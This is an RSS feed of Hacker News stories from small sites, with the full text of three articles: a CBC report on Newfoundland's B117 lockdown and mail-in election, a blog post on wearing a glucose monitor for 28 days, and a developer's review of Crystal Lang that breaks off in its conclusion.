<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>
<![CDATA[Hacker News - Small Sites - Score >= 2]]>
        </title>
        <description>
<![CDATA[Hacker News stories from domains that aren't in the top 1M and that have a score of at least 2. Updated nightly via https://github.com/awendland/hacker-news-small-sites]]>
        </description>
        <link>https://news.ycombinator.com</link>
        <generator>RSS for Node</generator>
        <lastBuildDate>Mon, 15 Feb 2021 08:35:35 GMT</lastBuildDate>
        <atom:link href="https://raw.githubusercontent.com/awendland/hacker-news-small-sites/generated/feeds/hn-small-sites-score-2.xml" rel="self" type="application/rss+xml"></atom:link>
        <pubDate>Mon, 15 Feb 2021 08:35:35 GMT</pubDate>
        <language>
<![CDATA[en-US]]>
        </language>
        <managingEditor>
<![CDATA[me@alexwendland.com (Alex Wendland)]]>
        </managingEditor>
        <ttl>240</ttl>
        <item>
            <title>
<![CDATA[Coronavirus variant puts Newfoundland back in lockdown]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 3 (<a href="https://news.ycombinator.com/item?id=26121658">thread link</a>) | @graeme
<br/>
February 12, 2021 | https://www.cbc.ca/news/canada/newfoundland-labrador/newfoundland-labrador-election-lockdown-1.5913042 | <a href="https://web.archive.org/web/*/https://www.cbc.ca/news/canada/newfoundland-labrador/newfoundland-labrador-election-lockdown-1.5913042">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>Newfoundland and Labrador is under full lockdown and Saturday's provincial election will continue with only mail-in voting, officials said Friday, as the province battles the B117 variant of the coronavirus.</p><div><figure><div><p><img loading="lazy" alt="" srcset="" sizes="" src="https://i.cbc.ca/1.5843708.1608137338!/fileImage/httpImage/image.jpg_gen/derivatives/16x9_780/janice-fitzgerald-dr-jatin-morkar-covid-vaccine.jpg"></p></div><figcaption>Newfoundland and Labrador's chief medical officer of health, Dr. Janice Fitzgerald, has returned the province to lockdown as an outbreak of variant B117 snowballs.<!-- --> <!-- -->(Patrick Butler/Radio-Canada)</figcaption></figure><div><h2><span>Latest</span></h2><ul><li><span>Elections NL cancels in-person voting set for tomorrow, extends special ballot deadline </span></li><li><span>Province-wide lockdown issued, reverting to strict rules last seen in May 2020</span></li><li><span>Top doctor confirms outbreak caused by UK coronavirus variant, B117</span></li><li><span>Newfoundland and Labrador adds 269 active infections in 5 days</span></li></ul></div><p><span><p>Newfoundland and Labrador is under lockdown, and Saturday's provincial election will continue with only mail-in voting, officials said Friday, as the province battles the B117 variant of the coronavirus.</p>  <p>In an emergency briefing&nbsp;Friday evening —&nbsp;the second time officials addressed the province in one day —&nbsp;Dr. Janice Fitzgerald, the chief medical officer of health, said tests had confirmed the&nbsp;widespread presence of B117&nbsp; for the first time.</p>  <p>The "variant of concern" is responsible for this week's mass outbreak in the capital.</p>  <p>Confirmation of the variant's arrival prompted lockdown&nbsp;measures across the province Friday and has suspended in-person voting in the election, delaying the ballot count&nbsp;by at least two weeks.&nbsp;</p>  <p>B117 was first discovered in the United Kingdom. It's believed to be more contagious than the original coronavirus strain.</p>  <p>"We know that if not controlled, it becomes a predominant strain within weeks of first appearance," Fitzgerald said. "This is concerning and serious. But we have the ability to overcome it."</p>  <p>Effective immediately, the entire province is at Alert Level 5, with all but essential businesses closed, Fitzgerald announced.</p>  <p>The decision expands&nbsp;previous measures implemented in the St. John's area this week, returning Newfoundland and Labrador to the same rules it followed for weeks last spring.</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5912464.1613155105!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/covid-testing-mundy-pond-blizzard.jpg 300w,https://i.cbc.ca/1.5912464.1613155105!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/covid-testing-mundy-pond-blizzard.jpg 460w,https://i.cbc.ca/1.5912464.1613155105!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/covid-testing-mundy-pond-blizzard.jpg 620w,https://i.cbc.ca/1.5912464.1613155105!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/covid-testing-mundy-pond-blizzard.jpg 780w,https://i.cbc.ca/1.5912464.1613155105!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/covid-testing-mundy-pond-blizzard.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5912464.1613155105!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/covid-testing-mundy-pond-blizzard.jpg"></p></div><figcaption>COVID-19 testing has spiked this week as Newfoundland and Labrador reports record daily cases.<!-- --> <!-- -->(Submitted by Lisa Warren)</figcaption></figure></span></p>  <p>Nine more cases have been added to the active total since the afternoon briefing, Fitzgerald said. Many of them are teenagers with mild or no symptoms.</p>  <p>There are now 269&nbsp;active cases in the province, with 253&nbsp;of them reported in the past five days.&nbsp;</p>  <p>The outbreak has come as a rude awakening for a province that regularly reported active total caseloads in the single digits, and over the summer survived a 42-day stretch without a single active infection.</p>  <p><em><strong>WATCH | Newfoundland and Labrador moves swiftly into lockdown:&nbsp;</strong></em></p>  <p><span><span><div><div title="Newfoundland and Labrador sees spike in COVID-19 cases" role="button" tabindex="0"><div><div aria-labelledby="1860314691986-metadata-" title="Newfoundland and Labrador sees spike in COVID-19 cases"><div><p><img src="https://thumbnails.cbc.ca/maven_legacy/thumbnails/567/351/COVID-NL-CASES-ELEX-YATES-120221.jpg" alt="" loading="lazy"></p></div></div></div></div></div><span>Newfoundland and Labrador reported Friday that it is dealing with the B117 COVID-19 variant. Some cases are outside the St. John's metro area, showing the outbreak is spreading, and leading to the suspension of in-person voting in Saturday's provincial election.<!-- --> <!-- -->1:50</span></span></span></p>  <p>Most cases, until now, have been linked to travel outside the province.</p>  <p>The province had 390 total cases of&nbsp;COVID-19 in all of 2020.&nbsp;&nbsp;&nbsp;&nbsp;</p>  <h2>Level 5 rules</h2>  <p>Fitzgerald said the discovery of the variant answered questions she had about the speed and scope of the virus's spread. Other provinces are battling the mutation, with experts in Ontario warning B117 could become the dominant strain there before April.</p>  <p>Due to the variant's contagious nature, Fitzgerald said the speed of isolation measures is critical to contain it.</p>  <p>Residents are now expected to remain inside their own homes as much as possible and restrict gatherings to no more than five people.</p>  <p>All non-essential businesses and facilities, including playgrounds, gyms, salons, cinemas, restaurants, bars, private health-care clinics, and retail stores that do not provide the essentials of life, are now closed.</p>  <p>Elective surgery and non-emergent medical treatments are&nbsp;also suspended.</p>  <p><em><strong>Watch the Government of Newfoundland and Labrador briefing:</strong></em></p>  <p><span><span><iframe src="https://www.youtube.com/embed/e68GaBbp81c" frameborder="no" title="YouTube content" allowfullscreen=""></iframe></span></span></p>  <p>"At this point, stay in your bubble," Fitzgerald said, simplifying&nbsp;the strict public health directions that Newfoundlanders and Labradorians haven't faced since last May.</p>  <p>"We're back here for a little while. I'm hopeful that we won't have to lock down like we did previously."</p>  <p>Health Minister John Haggie said vaccine rollout will continue as promptly as possible, but the timeline largely depends on delivery schedules, which have proved spotty throughout the country.</p>  <h2>Election day battered by outbreak</h2>  <p>Bruce&nbsp;Chaulk, the province's chief electoral officer, issued a media release immediately after the briefing&nbsp;that he had suspended in-person voting in all 40 districts across the province.</p>  <p>"In-person voting will not be rescheduled," said Bruce&nbsp;Chaulk&nbsp;in a statement. "The election will now shift exclusively to voting by mail."</p>  <p>The deadline to apply for mail-in special ballots has been extended to Feb. 15. Voting packages must be received by Elections NL by March 1.</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5874466.1610711279!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/andrew-furey-wearing-liberal-red-mask.jpg 300w,https://i.cbc.ca/1.5874466.1610711279!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/andrew-furey-wearing-liberal-red-mask.jpg 460w,https://i.cbc.ca/1.5874466.1610711279!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/andrew-furey-wearing-liberal-red-mask.jpg 620w,https://i.cbc.ca/1.5874466.1610711279!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/andrew-furey-wearing-liberal-red-mask.jpg 780w,https://i.cbc.ca/1.5874466.1610711279!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/andrew-furey-wearing-liberal-red-mask.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5874466.1610711279!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/andrew-furey-wearing-liberal-red-mask.jpg"></p></div><figcaption>Premier Andrew Furey called the Feb. 13 election last month, and has faced rising criticism over his choice of timing.<!-- --> <!-- -->(Paul Daly)</figcaption></figure></span></p>  <p>The embattled election hasn't weathered the outbreak well,&nbsp;with poll workers resigning en masse,&nbsp;delaying election day for the province's most populated region.</p>  <p>Liberal Leader Andrew Furey, campaigning to reinstate himself in the premier's chair, has repeatedly come under fire for triggering an election prior to widespread vaccine availability.&nbsp;</p>  <p>Furey was compelled by law to call an election within a year of taking over as the head of the Liberal Party, with his deadline in August. When he dropped the writ in January, the province had a steadily low caseload.</p>  <p>As the outbreak worsened this week, Furey repeatedly defended his election timing.</p>  <p>"I haven't given much thought to the election," Furey said Friday evening, prior to Chaulk's announcement and just as news broke of B117's arrival. "I understand there are questions about the election … but we don't have the answers."</p>  <h2>Accountability ahead: opponents</h2>  <p>Fitzgerald said she has spoken with the province's chief electoral officer&nbsp;but would not disclose the advice she gave him when pressed during the briefing, saying it's not her jurisdiction.</p>  <p>Furey's opponents had been calling for an election delay this week&nbsp;and applauded the decision to move to special ballots. NDP Leader Alison Coffin expressed concern, however, that some people may face barriers&nbsp;in registering for mail-in voting by Monday.</p>  <p>"We may see some court challenges come from this," Coffin said. "What I'm more concerned about is how irresponsible Andrew Furey's actions were."</p>  <p>Progressive Conservative Leader Ches Crosbie declined an interview&nbsp;but said in a statement his party would discuss Furey's election timing "another day," saying the public health emergency is the&nbsp;priority.</p>  <p>"Our province deserves a thoughtful conversation about why it took so long for us to reach the right decision in postponing this election and how we hold our political leaders accountable," the statement read.</p>    <p>Earlier on Friday, officials reported 50 new cases of COVID-19, with the vast majority in the St. John's metro region. The province has reported&nbsp;higher-than-average new cases since Monday, when rampant community spread was first identified.</p>  <p>Thousands of people are now in isolation, including 300 health-care workers.</p>  <p><em><strong><a href="https://www.cbc.ca/news/canada/newfoundland-labrador">Read more from CBC Newfoundland and Labrador</a></strong></em></p></span></p></div></div>]]>
            </description>
            <link>https://www.cbc.ca/news/canada/newfoundland-labrador/newfoundland-labrador-election-lockdown-1.5913042</link>
            <guid isPermaLink="false">hacker-news-small-sites-26121658</guid>
            <pubDate>Sat, 13 Feb 2021 05:34:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What a person without diabetes learned from 28 days with a glucose monitor]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=26121447">thread link</a>) | @jseliger
<br/>
February 12, 2021 | https://www.levelshealth.com/blog/cgm-what-a-person-without-diabetes-learned-from-28-days-wearing-a-continuous-glucose-monitor | <a href="https://web.archive.org/web/*/https://www.levelshealth.com/blog/cgm-what-a-person-without-diabetes-learned-from-28-days-wearing-a-continuous-glucose-monitor">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><header id="header"></header><main id="main"><section id="content-articles" data-ani-anchor="onload"></section><section id="blog-single-content" data-ani-anchor=""><div><div><p>After scary bouts of hypoglycemia as a kid, Blake Reichmann thought he had a solid low-sugar diet. Then a CGM taught him where he could do better.</p></div><div><div><div><div data-bg="/wp-content/uploads/2020/10/bessi-profile.png"> <img src="data:image/svg+xml,%3Csvg%20xmlns=%22http://www.w3.org/2000/svg%22%20viewBox=%220%200%20210%20140%22%3E%3C/svg%3E" data-src="https://secure.gravatar.com/avatar/09b375d3b3a726e5e6486b60cc17de94?s=32&amp;d=mm&amp;f=y&amp;r=g"></div></div></div></div><div id="featured-image-single-v"> <img src="https://www.levelshealth.com/wp-content/uploads/2021/01/Patch.png" data-src="https://www.levelshealth.com/wp-content/uploads/2021/01/Patch.png" aria-label="The CGM Challenge: What a person without diabetes learned from 28 days with a continuous glucose monitor"></div><div id="single-content-content"><div><p><span>I never thought I’d have a tiny probe stuck in my arm for 28 days. I’m not diabetic or even prediabetic. But when I stumbled on the chance to wear a continuous glucose monitor (CGM) as part of a challenge partnered with Levels, I jumped on it. I’ve been conscious of blood sugar my whole life because I suffered from spells of hypoglycemia as a child.</span></p><p><span>Hypoglycemia is when your blood sugar drops below 70mg/dL. I still don’t know why it happened, but it wasn’t fun. When my glucose levels dropped too low, I’d experience cold sweats, lightheadedness, trembling hands, and an elevated heart rate. These symptoms were likely the result of my body releasing epinephrine (adrenaline) to stabilize my blood glucose.</span></p><p><span>Over the years, I started to pick up on which foods caused my blood sugar to crash. The biggest culprits were cereal for breakfast and sweet tea later in the day. Every time I ate a big bowl of cereal before school (usually Frosted Mini-Wheats or Honey Nut Cheerios), I would crash around 10:30 a.m. like clockwork. Sometimes the crashes were so bad that I thought I might pass out, so I’d call my mom to check me out of school.</span></p><p><img src="https://www.levelshealth.com/wp-content/uploads/2021/01/Blake-Reichman-Profile_Picture-200x200.jpg" data-src="https://www.levelshealth.com/wp-content/uploads/2021/01/Blake-Reichman-Profile_Picture-200x200.jpg" alt="" width="200" height="200" data-srcset="https://www.levelshealth.com/wp-content/uploads/2021/01/Blake-Reichman-Profile_Picture-200x200.jpg 200w, https://www.levelshealth.com/wp-content/uploads/2021/01/Blake-Reichman-Profile_Picture-400x400.jpg 400w, https://www.levelshealth.com/wp-content/uploads/2021/01/Blake-Reichman-Profile_Picture.jpg 512w" data-sizes="(max-width: 200px) 100vw, 200px" srcset="https://www.levelshealth.com/wp-content/uploads/2021/01/Blake-Reichman-Profile_Picture-200x200.jpg 200w, https://www.levelshealth.com/wp-content/uploads/2021/01/Blake-Reichman-Profile_Picture-400x400.jpg 400w, https://www.levelshealth.com/wp-content/uploads/2021/01/Blake-Reichman-Profile_Picture.jpg 512w"></p><p><span>Experiencing low blood sugar not only made it hard to focus but was, quite frankly, a scary experience for someone who didn’t understand what was going on. After missing a few classes from these episodes, my mom decided it was time to change my diet.</span></p><p><span>I went from eating cereal in the mornings to eggs, bacon, and fruit (berries or avocado) and cut out the sweet tea (tough to do for a boy raised in Alabama). Once I made those changes, the crashes stopped, and I had energy throughout the day.</span></p><p><span>At the time, I didn’t fully understand why the switch worked, but I did understand even at a young age that consuming a bunch of carbs and sugar wasn’t good for me. Since then, I’ve become fascinated with maintaining a healthy lifestyle and finding ways to improve my health. My curiosity for seeking ways to optimize my diet is what eventually led me to put a CGM on my arm.</span></p><h2>The Challenge</h2><p><span>I first learned about the 28-day </span><a href="https://www.wearablechallenge.com/"><span>Wearable Challenge</span></a><span> from following </span><a href="https://twitter.com/jwmares"><span>Justin Mares</span></a><span> on Twitter. I’ve followed Justin for quite a while since he knew a lot about the health-and-wellness space after founding two health food companies, </span><a href="https://www.kettleandfire.com/"><span>Kettle &amp; Fire</span></a><span> and </span><a href="https://perfectketo.com/"><span>Perfect Keto</span></a><span>.</span></p><p><span>In October, Justin shared an </span><a href="https://twitter.com/jwmares/status/1315696415213936641"><span>interesting tweet</span></a><span> about a weight-loss challenge that only required participants to track their blood glucose with a </span><a href="https://www.levelshealth.com/"><span>Levels</span></a><span> CGM. After reading the tweet, I knew this was something I had to try. Even though the challenge focused on weight loss, I enrolled immediately because I wanted to experiment with a CGM to see how my body reacts to my diet.</span></p><p><span>The challenge required me to keep my glucose levels below 120mg/dL even after a meal. For every day I went over, I’d lose $25 (talk about having skin in the game). The challenge started with a three-day grace period, so I could experiment with my diet to see how it impacted my glucose without getting penalized.</span></p><p><span>(For context, according to the</span><a href="https://www.idf.org/component/attachments/attachments.html?id=728&amp;task=download"> <span>International Diabetes Federation (IDF) guidelines</span></a><span>, your glucose values are “normal” if they stay below 140mg/dL after meals and return to pre-meal levels within two to three hours. Since this is a challenge geared towards weight loss, the upper limit was set slightly lower.)</span></p><p><b>Related article: </b><a href="https://www.levelshealth.com/blog/what-should-my-glucose-levels-be-ultimate-guide"><b>What should your glucose levels be? Here’s the ultimate guide to healthy blood sugar ranges</b></a></p><p><span>To help stay in the target range, each member of the challenge had access to a WhatsApp group chat to support each other. The group chat was a place for members to share what diet was working well, vent their frustrations when they failed, and provide a positive environment for motivation and encouragement. This aspect was less useful for me (I ended up muting it after a few days) because my goals were different. Still, I could see how much other members appreciated the accountability and support.</span></p><h2>What I Learned</h2><p><span>Overall, I found the challenge to be a learning experience filled with joyful moments of self-confirmation, times of utter disappointment, and a few surprises in between.</span></p><h3>The Good</h3><p><span>The best news was discovering that my typical breakfast of three eggs, bacon, and half an avocado drizzled in olive oil caused almost no glycemic response, nor did my afternoon snack of raw almonds. The app showed that these foods consistently hit a perfect score. Since I eat these foods most often, it was comforting knowing that I had a strong foundation.</span></p><p><img src="https://www.levelshealth.com/wp-content/uploads/2021/01/Breakfast-3.png" data-src="https://www.levelshealth.com/wp-content/uploads/2021/01/Breakfast-3.png" alt="" width="400" height="600" data-srcset="https://www.levelshealth.com/wp-content/uploads/2021/01/Breakfast-3.png 400w, https://www.levelshealth.com/wp-content/uploads/2021/01/Breakfast-3-267x400.png 267w, https://www.levelshealth.com/wp-content/uploads/2021/01/Breakfast-3-133x200.png 133w" data-sizes="(max-width: 400px) 100vw, 400px" srcset="https://www.levelshealth.com/wp-content/uploads/2021/01/Breakfast-3.png 400w, https://www.levelshealth.com/wp-content/uploads/2021/01/Breakfast-3-267x400.png 267w, https://www.levelshealth.com/wp-content/uploads/2021/01/Breakfast-3-133x200.png 133w"></p><p><span>The challenge also confirmed my belief that eating a low-carb paleo/keto-inspired diet consisting of mostly meat, vegetables, and healthy fats (olive oil, coconut oil, and butter/ghee) was optimal for maintaining consistent glucose levels.</span></p><p><img src="https://www.levelshealth.com/wp-content/uploads/2021/01/Almonds-3.png" data-src="https://www.levelshealth.com/wp-content/uploads/2021/01/Almonds-3.png" alt="" width="350" height="500" data-srcset="https://www.levelshealth.com/wp-content/uploads/2021/01/Almonds-3.png 350w, https://www.levelshealth.com/wp-content/uploads/2021/01/Almonds-3-280x400.png 280w, https://www.levelshealth.com/wp-content/uploads/2021/01/Almonds-3-140x200.png 140w" data-sizes="(max-width: 350px) 100vw, 350px" srcset="https://www.levelshealth.com/wp-content/uploads/2021/01/Almonds-3.png 350w, https://www.levelshealth.com/wp-content/uploads/2021/01/Almonds-3-280x400.png 280w, https://www.levelshealth.com/wp-content/uploads/2021/01/Almonds-3-140x200.png 140w"></p><p><span>Over the past four years, I’ve made a conscious effort to cook meals that avoid simple carbs, vegetable oils, and sweeteners, and it felt really good knowing I’d been making the right choices.</span></p><h3>The Not-So-Good</h3><p><span>The foods with the most considerable impact on my blood sugar were white rice and craft beer, although I can’t say I was surprised. Unfortunately, I love both of these things (so long Chipotle burrito bowls). It was disappointing to finally have to stare down the truth instead of continuing to live in willful ignorance.</span></p><p><img src="https://www.levelshealth.com/wp-content/uploads/2021/01/Chipotle-1.png" data-src="https://www.levelshealth.com/wp-content/uploads/2021/01/Chipotle-1.png" alt="" width="350" height="500" data-srcset="https://www.levelshealth.com/wp-content/uploads/2021/01/Chipotle-1.png 350w, https://www.levelshealth.com/wp-content/uploads/2021/01/Chipotle-1-280x400.png 280w, https://www.levelshealth.com/wp-content/uploads/2021/01/Chipotle-1-140x200.png 140w" data-sizes="(max-width: 350px) 100vw, 350px" srcset="https://www.levelshealth.com/wp-content/uploads/2021/01/Chipotle-1.png 350w, https://www.levelshealth.com/wp-content/uploads/2021/01/Chipotle-1-280x400.png 280w, https://www.levelshealth.com/wp-content/uploads/2021/01/Chipotle-1-140x200.png 140w"></p><p><span>I was also disappointed to learn how much sweet potato spikes my blood sugar. I knew sweet potatoes had a lower </span><a href="https://www.health.harvard.edu/diseases-and-conditions/glycemic-index-and-glycemic-load-for-100-foods"><span>glycemic index (GI)</span></a><span> than regular potatoes, but they still pushed me over the limit. I plan to keep them in my diet but will be more conscious about how often I eat them.</span></p><h3>The Surprising</h3><p><span>The biggest surprise of the challenge was discovering that quality tequila (G4 Reposado) had almost no effect on my blood sugar. Tequila that is 100% agave has zero carbs because of the distillation process (an average craft IPA has around 13g of carbs). Since beer is my usual go-to if I want a drink, I was happy to learn there was a healthier substitute I already enjoyed.</span></p><p><span>I also recognize I need to be careful here. Just because I didn’t experience a glucose spike doesn’t mean I didn’t have a biological response. </span><a href="https://academic.oup.com/ajcn/article/85/6/1545/4632987"><span>Research suggests</span></a><span> that alcohol decreases the liver’s ability to make new glucose, so it can trigger hypoglycemia, especially if you’re fasting or in a ketogenic state.</span></p><p><b>Related article: </b><a href="https://www.levelshealth.com/blog/alcohol-and-metabolic-fitness"><b>What does alcohol do to my glucose levels?</b></a></p><p><span>Another big surprise was discovering that my glucose levels aren’t just impacted by <em>what</em> I eat but also <em>when</em> I eat. I confirmed this because I meal prep twice a week to save time by eating the same meal multiple days in a row. (You may find that boring; I find it efficient.)</span></p><p><span>Eating the same thing for lunch and dinner on several challenge days was great for understanding how my body responds to food at different times of the day. All else being equal, my glucose spikes more after dinner than it does for lunch—sometimes by as much as 20mg/dL!</span></p><p><span>Even more surprising was noticing how little change there was from eating the same meal from day to day, but then having a large variance between lunch and dinner. I’m sure there’s a reason why, but I couldn’t tease a convincing explanation out of the data.</span></p><p><img src="https://www.levelshealth.com/wp-content/uploads/2021/01/Nov-11-1.png" data-src="https://www.levelshealth.com/wp-content/uploads/2021/01/Nov-11-1.png" alt="" width="350" height="500" data-srcset="https://www.levelshealth.com/wp-content/uploads/2021/01/Nov-11-1.png 350w, https://www.levelshealth.com/wp-content/uploads/2021/01/Nov-11-1-280x400.png 280w, https://www.levelshealth.com/wp-content/uploads/2021/01/Nov-11-1-140x200.png 140w" data-sizes="(max-width: 350px) 100vw, 350px" srcset="https://www.levelshealth.com/wp-content/uploads/2021/01/Nov-11-1.png 350w, https://www.levelshealth.com/wp-content/uploads/2021/01/Nov-11-1-280x400.png 280w, https://www.levelshealth.com/wp-content/uploads/2021/01/Nov-11-1-140x200.png 140w"></p><h2>What’s Changed</h2><p><span>Since the challenge ended, I’ve made a few adjustments to my diet. I’m not one to make radical changes (like cutting out a particular food from my diet forever), but now I’m more careful when I still want to splurge. Here are some of the changes I’ve made:</span></p><ul><li aria-level="1"><span>If I’m going to drink, I opt for quality spirits (neat or on the rocks) over craft beer or cocktails loaded with sugar.</span></li><li aria-level="1"><span>I’ve reconsidered the idea of a cheat day. I still plan on enjoying the occasional night of pizza and beer or tacos and margaritas, but a cheat day isn’t just a day. Now that I’m aware that the effects of an unhealthy meal can last for 2-3 days, I better make sure that the meal is worth it.</span></li><li aria-level="1"><span>I need to avoid any sweetened beverage, no matter how “healthy.”&nbsp; Smoothies, sweetened kombucha, and sweetened coffee wrecked my glucose levels, even though they’re often touted as healthy choices. Better to eat my sweets after a hearty meal than to drink them.</span></li><li aria-level="1"><span>I’m now more conscious of what I order when I eat out. For example, I opt for the salad at Chipotle instead of the burrito bowl. I’ve also switched to eating more sashimi instead of sushi to avoid eating as much rice.</span></li></ul><p><span>Even though the challenge only lasted 28 days, I learned more about my diet and lifestyle in those four weeks than I had from any previous blood test or book on dieting. The challenge confirmed that I already eat a healthy diet, but I need to make a few changes to ensure a healthy life for decades to come.</span></p><p><em><span>To learn more about the 28-day </span><a href="https://www.wearablechallenge.com/"><span>Wearable Challenge</span></a><span><a href="https://www.wearablechallenge.com/">, click here</a>.</span></em></p><p><em>Adapted from an original post <a href="https://lawsonblake.com/continuous-glucose-monitoring-levels-health/">here</a>.&nbsp;</em></p></div></div></div></section><section id="blog-single-content-related" data-ani-anchor=""></section></main>         </div>]]>
            </description>
            <link>https://www.levelshealth.com/blog/cgm-what-a-person-without-diabetes-learned-from-28-days-wearing-a-continuous-glucose-monitor</link>
            <guid isPermaLink="false">hacker-news-small-sites-26121447</guid>
            <pubDate>Sat, 13 Feb 2021 04:41:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[3 years of Crystal Lang programming: The good, the bad, the ugly]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 2 (<a href="https://news.ycombinator.com/item?id=26120995">thread link</a>) | @iomcr
<br/>
February 12, 2021 | https://anykeyh.hashnode.dev/3-years-of-crystal-lang-programming-the-good-the-bad-the-ugly | <a href="https://web.archive.org/web/*/https://anykeyh.hashnode.dev/3-years-of-crystal-lang-programming-the-good-the-bad-the-ugly">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text"><p><img src="https://crystal-lang.org/assets/media/crystal_logo.svg" alt="Crystal Logo"></p>
<p>It's been more than three years since I've been hooked into Crystal Lang. For
those who don't know, Crystal promises to be able to write high-level code,
borrowing syntax from Ruby while adding strongly-typed yet inferred parameters
and avoiding the null exception problem. It also provides a complete and powerful <em>stdlib</em> and uses concepts from new generation languages like Go Lang. </p>
<p>Oh, and a powerful on-compile time macro system making runtime reflection obsolete! </p>
<p>Did it fulfill its promises? Yes. At some costs.</p>
<p>I started developing in Crystal Lang out of curiosity and pleasure, as I thought
this is a fun language to work with. 
Then I challenged myself to see what I was able to write, and it ended up with <em><a target="_blank" href="https://github.com/anykeyh/clear">Clear</a></em>, an ORM I've built from scratch.</p>
<p>Eventually, I started working on a booking platform. Getting free hands on the technical side, I decided to design the backend in Crystal. </p>
<p>Nine months later and an app finished, I can give some insight about using Crystal in a professional environment; the <strong>good</strong>, the <strong>bad</strong>, and the <strong>ugly</strong>, and how to develop an app in a language that is still considered confidential and in a pre-release state.</p>
<h2 id="the-good">The good</h2>
<p>Crystal kept its promise in being a very expressive language. It allowed me to
write clean high-level business code, allowing to lower the gap between clients
requirement and code syntax. Big <em>oui</em> here!</p>
<pre><code>
post <span>"/contact_us"</span> <span>do</span> <span>|env|</span>
  form = ContactUsForm.from_json(env.request.body.not_nil!)
  Mail.deliver ContactUsEmail.new(form.email, form.title, form.message)
<span>end</span>
</code></pre>
<p>The customer had some very complex rules when bookings were moved or canceled,
and I was aware that two teams of developers had given up on this project prior
to my work. </p>
<p>I decided to go for a Controller - Business Logic - Model 3-tier on
the backend and keep the View and Presentation on the frontend (using Typescript
and MithrilJS). </p>
<p>Because Crystal is strongly typed, the work to be done on spec
and coverage of the code is strongly reduced, in comparison to a Ruby or Python
code. </p>
<p>80% of the bugs occurring in those script languages have their root cause
laying in lose parameter type or nullable type. Both cases are covered at
compile time in Crystal. Basically, I wrote only 120 test cases on this
application, covering the different business cases of the user. In Ruby, for an
application of this scale, I would be around 250 to 400 tests.</p>
<p>At release, the application faced very few bugs. 
Some edges case we forgot with the client were failing. But so far, the compiler did an excellent job in preventing most of the bugs. </p>
<p>Because the language is compiled, it is wonderful to use within a Kubernetes cluster: The app starts in less than 200ms, allowing horizontal scaling, health-check and automatic restart of the app much more convenient than a big Rails application. </p>
<p>Memory usage is relatively low, peeking to ~250Mb and I never experienced any memory leak whatsoever. </p>
<p>And it runs fast. Really fast. For those who used to work with Rails, Django, or Laravel,
we are comparing snails with a cheetah there. </p>
<p>Actually, it runs so fast that I decided to do some complex data aggregation and transformation directly in Crystal instead of PostgreSQL.</p>
<h2 id="the-bad">The bad</h2>
<p>The major challenge I faced in keeping a good pace and being productive was the
compilation time. It takes around 20 seconds to compile/run spec on my i7 8750H.
We are talking of an app with ~9000 LOC, few shards (library), for a grand total
of probably less than 100k LOC. This compilation time is mostly due to the very
dynamic nature of Crystal lang, the work needed to be done at
compile-time  (<em> macro and type inference being the culprits </em>) , and the lack of
incremental compilation at the time of writing this article. 20 seconds seems
not much, but during a whole working day, it builds-up leading to a
non-negligible loss of productivity. For the defense of the language, the
problem is also at the developer level: it is just enough to lose focus, browse
few tabs on Reddit, check a video on Youtube, and can - too often! -  snowball
to minutes or more. Guilty I am!</p>
<p>Another challenge was the usage of the young library ecosystem. The language is
still confidential and some shards  (the name which is given to libraries in the Crystal
world) are not working with the latest version of Crystal, or lack of support,
as some authors just gave up on the language or have little to no time to
maintain them. 
I can't complain, as I am too responsible for this, as I gave little maintenance the last months over <a target="_blank" href="https://github.com/anykeyh/clear">Clear ORM</a>.</p>
<h2 id="the-ugly">The ugly?</h2>
<p>During development, I faced a few but worrying bugs, where the compiler was
literally crashing without any idea of where the problem came from. It also
happens that using some complex features of the language, like inheriting from
generic classes could lead to segfault during execution after a while. Issues
were raised and the Crystal Lang team fixed everything on short notice.</p>
<p>Since now, I'm not able to build the backend using <code>--release</code> flag due to
segfault at compile time. 
This is not a problem <em>per se</em>, as even without the optimization, the backend spends like 90% of its time waiting for PostgreSQL. </p>
<p>I still get a random crash of the application I gave up fixing for now.
Basically, the app can't access anymore to the PostgreSQL database after a
while.
This occurs on average between 3 to 30 days of running; I defined an
<code>/healthcheck</code> endpoint throwing a simple <code>SELECT 1</code>; to check the connection, called each second by Kubernetes.</p>
<p>With multiple pods redundancy, and thanks to low
memory foot-print and quick start-up time, pods defaulted got evicted and
recreated in a matter of seconds.</p>
<h2 id="conclusion">Conclusion</h2>
<p><strong>If I did this app using Rails, would have I been more productive?</strong></p>
<p>It's hard to say, as I spent quite a lot of time debugging, improving, and
maintaining Clear ORM within the scope of this project. I think the
productivity difference would have been negligible.</p>
<p>What you would win by having a strict compiler avoiding your hours of debugging 
and specs definition, you lose by the compile-time, the need to rewrite some 
basic functionality you could get via gems. </p>
